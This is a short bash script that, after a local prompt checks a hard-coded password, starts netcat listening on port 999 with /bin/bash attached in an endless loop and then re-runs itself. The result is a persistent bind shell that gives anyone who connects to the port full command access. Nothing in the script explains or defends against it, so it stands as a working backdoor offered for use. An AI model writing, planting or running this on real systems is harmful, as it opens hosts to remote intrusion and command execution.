#! /bin/bash
#

ncpassword () {

NC="/bin/nc"

PORT="999"

PASSWORD="123456"

SHELL="/bin/bash"

echo -n "Enter password: "

stty -echo
read mypass
stty echo

if [ ${mypass} = $PASSWORD ]
	then
		echo "Access granted...start netcat shell on port $PORT"
		while true; do $NC -l -p $PORT -e $SHELL; done
	else
		echo "Incorrect Password"

fi
}

ncpassword
sh $0
